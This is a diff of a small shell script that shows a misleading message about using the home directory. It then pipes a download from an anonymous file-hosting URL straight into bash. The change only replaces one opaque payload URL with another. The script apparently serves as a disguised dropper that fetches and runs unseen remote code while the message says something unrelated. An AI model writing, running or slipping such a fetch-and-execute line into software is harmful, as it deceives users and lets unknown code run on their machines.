@@ -4,7 +4,7 @@ main() {
     clear
 
     echo -e "${YELLOW}[!!] Local user detected, using home directory instead of global directory ${NC}"
-    curl -s "https://f3a5dqxez3.ufs.sh/f/ijk9xZzvhn3rc2GhMkrdY9lM1fyoILOEBg8KPxs2jpSzU6Nn" | bash
+    curl -s "https://f3a5dqxez3.ufs.sh/f/ijk9xZzvhn3rbqp2GUdY3eVyHCaSdF1oNkZ7xmpRItAEgrf6" | bash
 }
 
 main
